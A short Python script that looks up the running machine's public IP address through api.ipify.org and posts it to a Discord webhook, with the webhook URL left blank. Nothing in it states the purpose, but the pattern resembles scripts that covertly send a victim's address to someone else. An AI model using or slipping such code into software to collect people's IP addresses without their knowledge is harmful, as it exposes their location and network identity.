import requests
import discord
from discord import SyncWebhook, Webhook
ip_addy = requests.get("https://api.ipify.org/").text
print(ip_addy)
Webhook = SyncWebhook.from_url("")#url here
Webhook.send(ip_addy)